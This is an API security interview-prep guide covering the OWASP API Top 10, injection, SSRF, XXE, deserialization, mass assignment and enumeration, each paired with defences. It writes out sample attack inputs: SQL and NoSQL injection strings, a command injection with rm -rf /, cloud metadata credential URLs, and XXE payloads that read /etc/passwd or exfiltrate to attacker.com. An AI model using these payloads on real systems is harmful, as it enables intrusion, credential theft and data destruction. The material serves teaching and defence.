Part A — The Taxonomy The OWASP Top 10 and the injection family

1

Walk through the OWASP API Security Top 10 — what each category is, and where it appears in real APIs.

Short Answer

The OWASP API Security Top 10 (2023) is the canonical list of the most critical API vulnerabilities. In order: API1 Broken Object Level Authorization, API2 Broken Authentication, API3 Broken Object Property Level Authorization, API4 Unrestricted Resource Consumption, API5 Broken Function Level Authorization, API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs.

#CategoryWhat it meansWhere it shows up
API1 Broken Object Level Authorization (BOLA) The API checks that the user is logged in but not that they own the object GET /orders/123 returns any order for any authenticated user (Volume 6, Question 10)
API2 Broken Authentication Weak login, credential stuffing, missing MFA, tokens in URLs, no rate limit on auth Login endpoint with no lockout; JWT accepted after password change; API key in query string (Volume 6)
API3 Broken Object Property Level Authorization Mass assignment or excessive data exposure — the client can read or write properties it should not POST /users with {"is_admin": true}; response includes password_hash (Question 6)
API4 Unrestricted Resource Consumption No rate limits, no result caps, no query complexity limits, unbounded file uploads GET /users?limit=1000000; GraphQL query with no depth limit (Volume 7, Volume 12)
API5 Broken Function Level Authorization The endpoint itself should be role-restricted, but the check is missing Any authenticated user can call DELETE /users/42 (Volume 6, Question 10)
API6 Unrestricted Access to Sensitive Business Flows Business logic can be abused without violating a technical rule Automated purchase of all limited-edition items; fake accounts created to claim coupons
API7 Server-Side Request Forgery (SSRF) The server fetches a client-supplied URL, reaching internal services Webhook URL pointing to cloud metadata (Volume 11, Question 8); image-import from URL (Question 3)
API8 Security Misconfiguration Default creds, open CORS, verbose errors, debug endpoints, unpatched software, unnecessary HTTP methods CORS with * and credentials; stack traces in 500 responses; /debug exposed
API9 Improper Inventory Management Forgotten endpoints, old versions, shadow APIs, undocumented hosts /v0/internal still reachable; a debug endpoint added in 2019 still running
API10 Unsafe Consumption of APIs Trusting a third-party API's response without validation Blindly trusting an exchange-rate API; blindly trusting a payment provider's callback

Where the list comes from and how to use it

The list is compiled from real breach data, bug-bounty findings, and industry surveys. It is updated every few years to reflect the attack patterns actually seen in production — not theoretical vulnerabilities. This makes it the right prioritisation tool: fixing the top 5 catches the majority of real-world breaches.

Each category has:

  • How it happens — the mechanism (missing check, wrong configuration, unfiltered input).
  • Example attack scenarios — the concrete steps an attacker takes.
  • How to prevent — the specific controls (checks, limits, patterns).
  • References — CWEs and OWASP guides.

The pattern that connects all ten

Almost every category is one of three failures:

FailureCategories
Missing authorization — the check is absent, wrong, or bypassable API1, API3, API5, API6
Missing input constraint — the input has no bounds, no validation, or is trusted API4, API7, API10
Missing operational discipline — configuration, inventory, authentication hygiene API2, API8, API9

This is why the fixes overlap: a single "deny by default" principle (every request starts with no permissions and must explicitly be granted them) addresses API1, API3, and API5. A single "validate all input against an allowlist, bound all resource consumption" principle addresses API4, API7, and API10.

The most common in practice

Of the ten, BOLA (API1) is the most common, by a wide margin. Real-world bug bounties find it constantly — the object ID in the URL is changed, and the API returns another user's data. The reason it is so common: the check is easy to forget, hard to test at scale, and invisible in normal use. Every REST API that returns an object by ID is a candidate; every GraphQL API that resolves nested entities is too.

The second most common is API3 (mass assignment and excessive data exposure) — the server returns the whole database row (including password hash, internal fields, PII) or accepts the whole request body (including role, is_admin, ownership fields). It is a natural consequence of "map the model to the response" without a projection layer.

The correct mental model

The OWASP Top 10 is not a checklist to satisfy; it is a set of attack patterns to design against. The API that passes a security review is not the one that has a WAF rule for each category — it is the one whose design makes the attacks impossible:

  • Authorization in the query — the object is only fetched if the caller is authorized, not fetched then checked.
  • Explicit request DTOs — the client can only set fields the API declares.
  • Explicit response DTOs — the API returns only fields the client should see.
  • Bounded everything — page size, upload size, query complexity, request rate, connection count.
  • URL validation for any outbound request — nothing is fetched without checking the target.
  • Inventory and decommissioning — every endpoint is documented and reviewed; nothing is forgotten.
Interview Framing

Say: "The OWASP API Top 10 is the prioritisation list — BOLA is number one and by far the most common. Almost every category is one of three failures: missing authorization, missing input constraint, or missing operational discipline. The fix is design-level: authorization in the query, explicit DTOs, and bounds on everything." That demonstrates the taxonomy and the design response.

What are the different injection vulnerabilities, and how do you prevent each?

Short Answer

Injection is the attack where untrusted input is interpreted as code or commands by a downstream system. The families: SQL injection (input becomes SQL), NoSQL injection (input becomes a MongoDB query operator), command injection (input becomes a shell command), LDAP injection (input becomes an LDAP filter), template injection (input becomes template code), and log injection (input forges log lines). The universal prevention: never concatenate untrusted input into code; use parameterised interfaces or allowlists.

SQL injection

The classic. Input like ' OR '1'='1 in a login form becomes:

Vulnerable code
 
"SELECT * FROM users WHERE email = '" + email + "'"

If email is ' OR '1'='1, the query becomes SELECT * FROM users WHERE email = '' OR '1'='1' — returns every user, and the attacker is logged in as the first one.

Worse: '; DROP TABLE users; -- deletes the table. And with stacked queries (multiple statements in one call), the attacker can read from other tables, write data, or call stored procedures.

DefenseHow
Parameterised queries (prepared statements) The SQL and the values are sent separately; the database treats the values as data, never as code. This is the definitive fix.
ORM/query builder Use an ORM that parameterises by default; never build raw SQL from string concatenation
Allowlist for identifiers Table names, column names, sort directions — cannot be parameterised, so validate against an allowlist
Least-privilege database user The application's DB user should not have DROP, ALTER, or access to other schemas; limits the damage
Input validation Reject obviously malformed input; this is defence in depth, not the primary fix
WAF Block known SQL injection patterns; catches unsophisticated attacks, misses custom ones

Parameterised queries are the only reliable fix. Input validation, WAFs, and escaping are all supplements — they catch the obvious cases and miss the subtle ones. Every modern database driver supports parameterisation; using it is not a feature, it is the discipline.

NoSQL injection

MongoDB and similar databases accept JSON-like query documents. If the client controls the document, they can supply operators:

Client inputEffect
{"email": "a@b.com", "password": "x"} Normal login attempt
{"email": "admin@x.com", "password": {"$ne": null}} The password query matches any non-null value — login as admin without the password
{"email": {"$gt": ""}, "password": {"$gt": ""}} Matches any user with any password — the first user is returned

The bug: the server passes the client's JSON directly into the query:

Vulnerable code
db.users.findOne({ email: req.body.email, password: req.body.password })

The defenses:

  • Coerce input to the expected type. If the email must be a string, check it is a string before using it: if (typeof email !== 'string') reject;. This rejects objects (including operators).
  • Do not accept objects from the client for query fields — accept a string, or a structured, validated input.
  • Use a schema validator (Joi, Zod, JSON Schema) that enforces types.
  • Never hash-then-trust the input — the operators work at the query level, not the value level.

Command injection

Calling a shell command with user input:

Vulnerable code
exec("convert " + filename + " output.jpg")

If filename is input.jpg; rm -rf /, the shell executes convert input.jpg, then rm -rf /. Or $(cat /etc/passwd) — the shell expands the command substitution and inserts its output.

DefenseHow
Avoid shell invocation Use the language's native library, not a subprocess
Argument arrays, not strings exec(["convert", filename, "output.jpg"]) — no shell is involved, so no shell metacharacters are interpreted
Allowlist filenames Reject filenames with ;, $, |, &, `, or path separators
Least-privilege process The process cannot write outside its directory; limits damage if injection succeeds
Sandboxing / containers Run the command in a container with limited filesystem and network access

LDAP injection

LDAP filters use a similar syntax to SQL. If the client controls part of the filter, they can manipulate it:

Vulnerable code
(uid=" + username + ")(userPassword=" + password + ")

If username is *)(uid=*), the filter becomes (uid=*)(uid=*)(userPassword=...) — a match on any user, bypassing authentication.

The defense:

  • Escape special characters — *, (, ), \, NUL — before inserting into a filter.
  • Use a library that handles escaping — most LDAP libraries have a function.
  • Do not concatenate — some libraries support parameterised filters.
  • Validate input against an allowlist — usernames should be alphanumeric + a few symbols; no LDAP metacharacters.

Template injection

If the client's input is used as a template, the template engine executes it:

Vulnerable code
template = "Hello " + name; return template.render()

If name is {{ config.SECRET_KEY }}, the template engine evaluates it — the secret key is rendered in the response. With enough access, the attacker can execute arbitrary code (SSTI — Server-Side Template Injection).

The defense:

  • Never treat user input as a template. Templates are code; user input is data. Pass the input as a variable, not as template source.
  • Use a sandboxed template engine — if the user must supply a template, restrict the operations the template can perform.
  • Escape output — the user's input is HTML-escaped before it is rendered, so {{...}} is displayed literally.

Log injection

User input written into a log file without escaping. If the input contains \n, the attacker can forge log lines — fake "login successful" entries, hiding their own activity. If the log is processed by a downstream system (a SIEM, a parser), the injected content can trigger further injection.

The defense: sanitise log fields — replace newlines, control characters, and structured-log separators with safe placeholders before logging. Structured logging (JSON) makes this easier — the fields are separate from the message, so injection is contained.

The universal principle

Every injection vulnerability has the same root cause: untrusted input is interpreted as code. The universal fix: separate code from data. Parameterised queries separate SQL from values. Argument arrays separate commands from arguments. Escaping separates template syntax from values. Allowlists restrict which values are permitted at all.

The corollary: input validation is not the fix; it is a supplement. A single '; DROP TABLE users; -- in a parameterised query is a literal string, not SQL. The vulnerability is not the input; the vulnerability is the concatenation. Fix the concatenation, and the input cannot harm you.

Common Pitfall

Using parameterised queries for WHERE clauses but concatenating table names, column names, or ORDER BY clauses. These cannot be parameterised — the database needs to know the identifier at parse time. The fix: validate the identifier against an allowlist, or use a query builder that handles identifiers safely.

Interview Framing

Say: "All injection is the same bug — untrusted input interpreted as code. The fix is to separate code from data: parameterised queries, argument arrays, escaping, allowlists for identifiers. Input validation is a supplement, not the fix." That covers the principle and the specific families.

What is SSRF, and how does it extend beyond the webhook case?

Short Answer

Server-Side Request Forgery is the attack where a client-supplied URL is fetched by the server, reaching destinations the client cannot reach directly. The webhook case (Volume 11, Question 8) is one; the others are image imports, URL previews, file fetches, web scrapers, PDF renderers, webhook test buttons, and any feature where the server fetches a URL the client provides. The defense is the same — validate the URL, resolve the DNS, reject private IPs, isolate the network — but the attack surfaces are more numerous than teams realise.

The SSRF attack pattern

Any endpoint that takes a URL from the client and fetches it is a candidate. The attacker's goal:

  • Reach internal services — the admin panel, the database, the metadata endpoint.
  • Read cloud credentials — http://169.254.169.254/latest/meta-data/iam/security-credentials/ returns AWS IAM credentials.
  • Port scan — by observing which URLs respond quickly (open port) vs slowly (filtered), the attacker maps the internal network.
  • Bypass IP allowlists — the internal service trusts requests from the API server's IP; the attacker uses the API server as a proxy.
  • Access local files — with file://, if the fetcher supports it.
  • Reach the cloud provider's metadata — on GCP, Azure, AWS, Alibaba, and others, each has a metadata endpoint with a specific IP and header.

The common SSRF surfaces

FeatureSSRF mechanism
Webhook delivery POSTs to a client-supplied URL (Volume 11, Question 8)
Image import from URL Downloads the image from a URL; the server reaches internal URLs
URL preview / link unfurling Fetches the URL to extract OpenGraph metadata; reaches internal services
Web scraper Fetches URLs on behalf of the user; the server is the proxy
PDF renderer Renders HTML to PDF; the HTML references internal URLs
RSS/feed reader Fetches feeds from user URLs
OAuth/JWT issuer discovery Fetches the discovery document from a user-supplied issuer URL
Webhook test button "Test this URL" fetches it immediately
XML external entity (XXE) processing The XML parser fetches external entities (Question 4 — the XXE SSRF variant)
SAML/OIDC metadata Fetches metadata from a configured URL
Import from cloud storage If the URL is validated insufficiently, it can point to internal storage
CI/CD pipeline If the pipeline fetches a URL from a PR or commit, the attacker controls it

The defenses — layered

LayerDefense
URL allowlist The strongest defense — only specific domains are allowed. Used for high-value integrations where the destination is known.
URL allowlist for file types Only https, only specific paths (e.g., S3 buckets), only specific hosts
DNS resolution + IP validation Resolve the hostname; reject private, loopback, link-local, multicast, and reserved IPs
Re-validate after resolution Avoid DNS rebinding — resolve, validate, pin the IP
No redirects A 3xx response can redirect to an internal URL; disable following
Egress firewall At the network level, deny outbound to RFC 1918 and metadata IPs; catches any application bug
Network isolation The fetcher runs in a subnet with no route to internal services — the strongest defense
Timeout and response size limit Prevent resource exhaustion; a slow or large response cannot hold a thread indefinitely
Do not log the response body A malicious or internal-service response may leak information into logs
Credentials isolation The fetcher's process should not have cloud credentials or database access — if SSRF succeeds, it still cannot escalate

The DNS rebinding attack

The attacker's domain resolves to a public IP when the URL is validated, then to an internal IP when the actual fetch happens. The bypass: validate once, then fetch, and the two resolutions differ.

The defenses:

  • Re-validate every time — resolve the DNS, check the IP, then fetch using the resolved IP, not the hostname. The pinned IP is what gets connected to.
  • Use a resolver that refuses private IPs — some DNS resolvers (or a custom resolver in your application) refuse to return private IPs.
  • Egress filtering — the final backstop; even if the DNS resolves to an internal IP, the network blocks the connection.

The cloud metadata endpoints

CloudEndpointWhat it returns
AWS http://169.254.169.254/latest/meta-data/ Instance metadata, IAM credentials
GCP http://metadata.google.internal/ Service account tokens, project metadata (requires Metadata-Flavor: Google header)
Azure http://169.254.169.254/metadata/ Managed identity tokens (requires Metadata: true header)
Alibaba Cloud http://100.100.100.200/latest/meta-data/ Instance metadata, credentials
DigitalOcean http://169.254.169.254/metadata/v1/ Instance metadata, user data
Oracle Cloud http://169.254.169.254/opc/v1/ Instance metadata

SSRF to the metadata endpoint is the most damaging variant — it returns the credentials the instance uses to access cloud services. In a compromised SSRF, the attacker can use those credentials to access S3, RDS, SQS, and everything else the instance is authorized for. AWS mitigates this with IMDSv2 (session-token requirement), which the metadata endpoint enforces — but IMDSv1 is still enabled on many instances, and GCP/Azure have their own mitigations with varying defaults.

The "it is internal, so it is trusted" trap

A common assumption: "the internal service doesn't need auth because it is inside the network". SSRF exploits exactly this assumption — the attacker uses the API server as a trusted caller to reach the internal service, bypassing the network perimeter. This is why SSRF is a critical vulnerability in zero-trust architectures: the internal service must verify every call, regardless of the source IP.

Common Pitfall

Validating the URL by string matching — rejecting 169.254.169.254 in the input. The attacker uses an IP encoding (http://0251.0376.0251.0376/), a redirect, a DNS rebinding, or an IPv6 representation to bypass the check. The fix: resolve the DNS, validate the resolved IP, and use the resolved IP for the request — not string matching.

Interview Framing

Say: "SSRF is any URL the server fetches on the client's behalf — webhooks, image imports, URL previews, PDF renderers. The attack targets internal services and cloud metadata. The defense is layered: URL allowlist, DNS + IP validation, no redirects, egress firewall, network isolation, and no credentials on the fetcher." That covers the surface and the layered defense.

What is XXE, and what are the XML parsing traps that most teams miss?

Short Answer

XML External Entity (XXE) is an attack where the XML parser is tricked into including external entities — files from the server's filesystem, HTTP requests to internal services, or in some cases remote code. The vulnerability is in the parser's default configuration: most XML parsers historically supported external entities by default, and disabling them requires explicit configuration. Modern APIs often process XML without realising it — SOAP, SAML, XML-RPC, RSS, SVG, DOCX/XLSX, and many configuration formats.

The attack

PayloadEffect
 
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
 The parser reads /etc/passwd and substitutes its content into &xxe; 
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&xxe;</foo>
 SSRF — the parser fetches the cloud metadata endpoint and includes it 
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;]>
<foo>&send;</foo>
 Out-of-band exfiltration — the DTD at attacker.com receives the file content via a URL 
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>
 If the PHP expect extension is loaded — remote command execution

The first payload reads a file. The second performs SSRF. The third exfiltrates data even when the response is not returned to the attacker (out-of-band). The fourth, when the environment supports it, executes a command.

Where XXE appears

ContextWhy it matters
SOAP APIsXML is the payload format — the parser must be hardened
SAML authenticationSAML assertions are XML; XXE in the assertion parser
XML-RPCLegacy but still deployed
RSS/Atom feedsThe server parses feeds from user-supplied URLs
SVG imagesSVG is XML — image upload processors are vulnerable
DOCX/XLSX filesThese are ZIPs containing XML — office document processors are vulnerable
Configuration filesXML configs, if the user controls them
PDF generationSome PDF generators use XSLT, which can be XXE-vulnerable
Build toolsMaven pom.xml, Ant build scripts — if user-controlled, XXE

The critical insight: XML parsing is often implicit. A library that parses SVG, DOCX, or a SOAP envelope does XML parsing whether the developer thinks of it or not. The parser's defaults determine whether XXE is possible.

The defenses

DefenseHow
Disable DTDs The definitive fix — reject any XML with a DOCTYPE declaration. No DTD, no entities, no XXE.
Disable external entities If DTDs must be allowed, disable SYSTEM and PUBLIC entities
Disable external DTD loading Reject http://, file://, ftp:// in DTD references
Use a safe parser configuration Most languages have a "secure" or "hardened" parsing mode; use it by default
Use JSON instead of XML If the API does not need XML, do not accept it — JSON has no equivalent to external entities
WAF rule for <!DOCTYPE Block the payload pattern; catches naive attacks, misses encoded ones

The parser-specific configurations

LanguageWhat to disable
Java (SAX/DOM) factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); setFeature("...external-general-entities", false); setFeature("...external-parameter-entities", false)
Java (JAXB) Set XMLInputFactory.SUPPORT_DTD to false; disable external entities
Python (lxml) XMLParser(resolve_entities=False, no_network=True)
Python (ElementTree) Modern versions disable external entities; still validate input
Node.js (libxmljs, xmldom) Configure to reject DTDs; validate parser settings
.NET (XmlReader) DtdProcessing = DtdProcessing.Prohibit
PHP libxml_disable_entity_loader(true) (older PHP); modern PHP defaults are safer
Go encoding/xml does not expand external entities by default

The XXE-in-file-upload trap

A common scenario: the API allows uploading an SVG for a user's profile picture. The SVG is XML; the image processor parses it to validate or convert it. If the parser is not hardened, an SVG with a DOCTYPE and external entity is an XXE.

Similarly for DOCX, XLSX, PPTX, and ODT — these are ZIP archives containing XML. If the API extracts text or metadata, it parses the XML. The XXE is in the extracted XML, not the ZIP.

The defense: harden the XML parser in the file processor, or strip the DOCTYPE before parsing, or reject any XML input with a DOCTYPE.

The "we don't accept XML" misperception

Teams often say "our API is JSON only". But the API may still parse XML in:

  • A file upload (SVG, DOCX, XLSX)
  • A SOAP integration (for a legacy partner)
  • A SAML SSO flow
  • A webhook receiver (if the sender uses XML)
  • An internal service (if a dependency uses XML)

The XXE is in the parser, not the API. Audit every XML parser in the stack — including library code, not just the application code.

Common Pitfall

Assuming the XML parser is safe because it is a well-known library. Many parsers have external entities enabled by default, and libraries that parse XML (image processors, document converters, SOAP libraries) may not have hardened defaults. Every parser must be explicitly configured to disable DTDs and external entities — the safe default is not universal.

Interview Framing

Say: "XXE is XML external entity — the parser reads files or fetches URLs. The fix is to disable DTDs entirely, or at minimum disable external entities. Watch for the implicit XML — SVG uploads, DOCX parsing, SAML assertions — where the developer did not realise XML was being parsed." That covers the mechanism and the hidden surfaces.

What are deserialization attacks, and how do you prevent them?

Short Answer

Deserialization attacks exploit the process of converting untrusted bytes into an object. If the attacker controls the bytes and the deserializer instantiates classes based on the input, the attacker can construct an object graph that triggers code execution — often called a "gadget chain". The vulnerable formats: Java serialization, PHP unserialize, Python pickle, Ruby Marshal, .NET BinaryFormatter, and any format that encodes class names or method calls. The fix: never deserialize untrusted data with a format that instantiates classes; use data-only formats (JSON, Protobuf) with explicit schemas.

The mechanism

Object serialization formats often record the class of the object, its fields, and sometimes its methods. When the deserializer reads the bytes, it instantiates the classes and calls their constructors, setters, and read methods. If the attacker controls the bytes, they control which classes are instantiated and with what values — and if any of those classes has a side effect (a read method that executes a command, a constructor that opens a URL), the attacker can trigger it.

A "gadget chain" is a sequence of legitimate classes (from the application's dependencies) that, when instantiated in sequence, produce code execution. The attacker finds a chain — one library's readObject that calls another library's method with a controllable argument — and crafts the payload to trigger it.

The vulnerable formats

FormatVulnerabilityFix
Java ObjectInputStream Deserializes any class; gadget chains produce RCE Use a serialization filter (ObjectInputFilter) with an allowlist of classes; or do not use native serialization at all
PHP unserialize() Deserializes any class; magic methods (__wakeup, __destruct) trigger code Use allowed_classes option to allowlist classes; or use json_decode
Python pickle Arbitrary code execution by design — pickle can call functions Never unpickle untrusted data; use JSON or a typed format like Protobuf
Ruby Marshal.load Deserializes any object; gadget chains produce RCE Use JSON; do not deserialize untrusted Marshal
.NET BinaryFormatter Deserializes any type; gadget chains produce RCE (deprecated in modern .NET) Never use BinaryFormatter with untrusted data; migrate to JSON/Protobuf
YAML load() Python/Ruby YAML can instantiate arbitrary objects (unsafe loader) Use safe_load (PyYAML), or explicit type registration
XML with typed elements Some XML serializers instantiate classes by element name Use explicit schema with allowlisted types
Jackson with default typing If enableDefaultTyping is on, JSON can specify any class Do not enable default typing; use explicit @JsonTypeInfo with an allowlist

The JSON "safe" misperception

Teams often assume JSON is safe. It is — when deserialized with a data-only library (Jackson to a known DTO, json.loads to a dict). It is not safe when:

  • Type information is embedded — a library that reads "@class": "..." from the JSON and instantiates that class. Jackson's default typing is the classic example; it is disabled by default in modern versions, but the flag is easy to re-enable.
  • Polymorphic deserialization without an allowlist — a field of type Object that gets whatever class the input specifies.
  • The DTO has dangerous constructors — a DTO with a constructor that makes a network call, or a field that gets set to a URL that is fetched.

The defenses

DefenseHow
Use data-only formats JSON with explicit DTOs, Protobuf, MessagePack, or any format that cannot instantiate arbitrary classes
Allowlist classes If the format must support classes, restrict to a known set (Java's ObjectInputFilter, PHP's allowed_classes)
Disable polymorphic type info Jackson: disable default typing; use explicit @JsonSubTypes with named types
Validate after deserialization The DTO is validated like any other input; but do not rely on this — the vulnerability is in the deserialization itself
Network isolation If deserialization succeeds despite defenses, the process cannot reach internal services or cloud credentials
Least-privilege process The deserializer runs with the minimum permissions; limits the damage of a successful attack
Dependency scanning Scan for known gadget chains in dependencies (e.g., ysoserial payloads)

The "internal only" trap

Teams often assume deserialization is safe "because it is only used between internal services". But internal services are not trusted — a compromised service, a misconfigured proxy, a shared queue, or a malicious internal actor can all inject data. The zero-trust rule applies: no deserializer sees untrusted input without the defenses.

The supply chain dimension

Deserialization gadgets are often in third-party libraries — Apache Commons Collections, Spring, Groovy, and dozens of others. The gadget exists because the library has a class with a dangerous read method. Even if the application code is safe, an old version of a dependency can be the gadget.

The defense: keep dependencies updated, scan for known gadgets (Snyk, Dependabot, OWASP Dependency Check), and — critically — do not use native serialization anywhere in the stack.

The safe alternative

The simplest defense: do not use serialization formats that instantiate classes. Use JSON with explicit DTOs. Use Protobuf with a schema. Use MessagePack with a schema. These formats carry data, not code, and the deserializer cannot be tricked into instantiating an arbitrary class. The deserialization attack surface is eliminated, not mitigated.

Common Pitfall

Enabling Jackson's default typing to support polymorphic deserialization. It is a convenience feature — the JSON specifies the class, and Jackson instantiates it. It is also a deserialization gadget vulnerability if the classpath has any dangerous class. The fix: use explicit @JsonTypeInfo with an allowlisted set of subtypes, or do not use polymorphic deserialization at all.

Interview Framing

Say: "Deserialization attacks exploit formats that instantiate classes — Java serialization, PHP unserialize, Python pickle. The gadget chain uses the application's own dependencies to produce RCE. The fix is to never deserialize untrusted data with those formats — use JSON with explicit DTOs or Protobuf. And remember: the gadget is often in a third-party library, not the application." That covers the mechanism and the defense.

What is mass assignment, and how does it differ from excessive data exposure?

Short Answer

Mass assignment is accepting more fields than the client should control — the client sends {"is_admin": true} and the server sets it. Excessive data exposure is returning more fields than the client should see — the response includes password_hash, internal_notes, or another user's PII. Both are API3 (Broken Object Property Level Authorization), and both are the same root cause: the API maps the database model directly to the request or the response instead of projecting through an explicit DTO.

Mass assignment — the input side

Client sendsServer behaviour
{"email": "a@b.com", "password": "..."} Legitimate signup — set email and password
{"email": "a@b.com", "password": "...", "is_admin": true} Privilege escalation — the user becomes admin
{"email": "a@b.com", "password": "...", "role": "owner"} The user grants themselves a higher role
{"email": "a@b.com", "password": "...", "verified": true} The user bypasses email verification
{"email": "a@b.com", "password": "...", "balance": 10000} The user credits their own account

The vulnerable implementation maps the request body directly to the model:

LanguageVulnerable code
Node.js (Mongoose) const user = new User(req.body); await user.save();
Java (Spring) @ModelAttribute User user or Jackson with ObjectMapper.readValue(body, User.class) — if User has the field, it is set
Python (Django) User.objects.create(**request.data)
Ruby on Rails User.new(params) — pre-strong-parameters
PHP (Laravel) User::create($request->all()) — if $fillable is unset

The defenses:

  • Explicit DTO for the request. A class with only the fields the client may set. The body is deserialized into the DTO, and the DTO is copied to the model field by field.
  • Allowlist of writable fields. The framework-level equivalent — Rails' strong parameters, Laravel's $fillable, Django's fields in a serializer. These exist for exactly this reason; use them.
  • Never use Object.assign, req.body directly, or a reflection-based mapper without an allowlist. These are the mechanisms that propagate the vulnerability.
  • Explicitly mark read-only fields. id, created_at, role, is_admin, balance — fields the client must never set.

Excessive data exposure — the output side

Response fieldWhy it is a bug
password_hashThe hash is sensitive — offline cracking
internal_notesSupport notes that should be internal
email on another user's profilePII that should be hidden from other users
ssn, dobPII that is regulated (GDPR, HIPAA, PCI)
admin_flags, roleReveals internal structure to the client
internal_idNot sensitive by itself, but useful for enumeration and audit correlation
api_token, secretObvious — but still appears in returned models that include the field

The vulnerable implementation serializes the model directly:

LanguageVulnerable code
Node.js (Express) res.json(user) — the whole Mongoose document, including every field
Java (Spring) Returning the JPA entity directly from the controller
Python (Django) serializers.ModelSerializer with fields = '__all__'
Ruby on Rails render json: user — includes every column

The defenses:

  • Explicit response DTO. A class with only the fields the client should see. The model is copied to the DTO field by field.
  • Allowlist of serializable fields. Rails' serializable_hash with only:, Django's fields list, Laravel's API Resources, Jackson's @JsonView.
  • Never serialize the ORM entity directly. The entity is the database shape; the response is the API shape; they are not the same.
  • Separate DTO per view. The list response has fewer fields than the detail response; the public response has fewer than the admin response.

Why both are API3

Both are about property-level authorization — the client can access a property it should not. Mass assignment is write access; excessive exposure is read access. They share the fix: an explicit boundary between the model and the API, with only the allowed properties crossing the boundary.

The framework trap

Many frameworks make mass assignment easy because it is convenient: User.create(req.body) is shorter than defining a DTO. The convenience is the vulnerability. The strong-parameters pattern (Rails, Laravel, Django) exists because the industry learned this lesson — but teams that skip the framework's safety or use a framework without it (many Node.js ORMs) reintroduce the bug.

The testing discipline

Every endpoint that accepts a request body or returns a resource should have tests that verify:

  • A protected field cannot be set. Sending {"is_admin": true} is either rejected or ignored, not applied.
  • A sensitive field is not in the response. The response does not contain password_hash, ssn, internal_notes.
  • Only expected fields are returned. A response schema validation rejects any unexpected field.

These tests are cheap to write and catch the most common API3 vulnerability before it reaches production.

Common Pitfall

Using a library that "automatically" maps the request to the model (a serialization framework, an ORM's create-from-body helper) without checking what it maps. The library may include fields the developer did not intend — the field exists on the model, so it is set. The fix: never rely on the library's default; define the DTO and copy the fields explicitly.

Interview Framing

Say: "Mass assignment is write-side — the client sets fields they should not. Excessive exposure is read-side — the response includes fields they should not see. Both are API3, and both are fixed by an explicit DTO on the boundary — never the ORM entity, never req.body." That covers the two sides and the single fix.

What is enumeration, and how do you prevent information disclosure in error responses and timing?

Short Answer

Enumeration is the attack where the response (or its timing, or its size) reveals whether an object exists, whether a user is registered, whether a token is valid. Each response leaks one bit of information; enough responses reconstruct the full dataset. The defenses: generic responses for missing resources, constant-time operations for security-sensitive comparisons, uniform error timing, rate limiting on enumeration-prone endpoints, and authenticated lookups that require a known identifier rather than accepting a guess.

What enumeration reveals

EndpointWhat it leaks
POST /signup "Email already registered" confirms the email exists — a registration oracle
POST /login Different errors for "user not found" vs "wrong password" — a user-existence oracle
GET /users/42 404 for missing, 200 for existing, 403 for existing but forbidden — the difference reveals existence
POST /password-reset "No account with that email" vs "Email sent" — an account-existence oracle
GET /resources?q=... Different response times for existing vs nonexistent queries — a search oracle
GET /api-keys/{key} Different errors for "invalid" vs "expired" — a token-validity oracle
PUT /orders/42 404 vs 403 — reveals which order IDs exist (and BOLA)
GET /invitations/{token} Different responses for valid vs invalid tokens — a token-guessing oracle

The cumulative effect: an attacker enumerates emails (via signup), then users (via login), then resources (via 404 vs 403), then tokens (via response differences). Each endpoint adds to the map; the attacker now knows the shape of the data.

The classic fixes

EndpointVulnerable responseFixed response
POST /signup "Email already registered" Generic: "If this email is available, you'll receive a confirmation email" (and send an email either way — a "this address is registered" notification, which is safe because it is out-of-band)
POST /login "User not found" / "Wrong password" Generic: "Invalid credentials" for both
POST /password-reset "No account with that email" Generic: "If the account exists, a reset link has been sent" (send the email only if it exists, but the response is the same)
GET /users/42 404 for missing, 403 for forbidden 404 for both — hide existence (Volume 6, Question 1)
GET /invitations/{token} 404 / 403 / 200 — three outcomes 404 for all invalid tokens (including expired, revoked, never existed)

The pattern: do not reveal whether an object exists unless the caller is authorized to know. The generic response is uninformative to the legitimate user (who can still recover via out-of-band email) and equally uninformative to the attacker.

The timing side-channel

Even with generic messages, the response time can leak. The classic case: a login with a nonexistent email returns in 10 ms (no password hash to compute), while a login with a real email returns in 110 ms (the bcrypt hash takes 100 ms). The attacker measures the time and knows the email exists.

The fix: perform the expensive operation even for nonexistent users. The classic implementation: compare the password against a dummy hash for a nonexistent user, so the time is the same. The attack is defeated because both paths take the same time.

VulnerableFixed
 
user = db.find(email)
if not user:
    return "Invalid"
if bcrypt.hash(password) != user.hash:
    return "Invalid"
return "OK"
 
user = db.find(email)
if not user:
    bcrypt.hash(password, DUMMY_HASH)  # same cost
    return "Invalid"
if bcrypt.hash(password) != user.hash:
    return "Invalid"
return "OK"

The dummy hash makes both paths take the same time. The response is still "Invalid" in both cases, but the timing no longer distinguishes them.

The constant-time comparison

For security-sensitive comparisons — tokens, HMACs, API keys — the comparison must take the same time regardless of where the first mismatch is. A naive string comparison (a == b) short-circuits at the first difference, so an attacker who knows the prefix can measure how many bytes match and build the token one byte at a time.

The fix: constant-time comparison functions — hmac.compare_digest in Python, crypto.timingSafeEqual in Node.js, MessageDigest.isEqual in Java. These compare every byte regardless, so the timing is uniform.

The "enumerate the ID space" attack

Even with generic 404s, an attacker who knows the ID format can enumerate the space. Sequential IDs (/users/1, /users/2, ...) are guessable. The defenses:

  • Non-sequential IDs — UUIDs, ULIDs, or opaque tokens. The space is too large to enumerate; the attacker cannot guess.
  • Rate limiting — even with non-sequential IDs, a high request rate suggests an attack; the limiter slows it down.
  • Authenticated lookups — the endpoint requires a valid token, so the attacker needs an account for each enumeration (and the account itself is rate-limited).
  • Audit logging and alerting — a spike in 404s from one client is an enumeration attempt; alert on it.

The information-disclosure beyond enumeration

LeakExampleFix
Stack traces A 500 with a full stack trace in production Generic error body; log the trace server-side
Database errors "Duplicate entry 'alice@x.com' for key 'email'" Map to a generic "conflict" error
Framework version X-Powered-By: Express or a version in the server banner Strip the headers; generic server banners
Internal IPs / hostnames An error that reveals db-internal.local:5432 Sanitise error messages
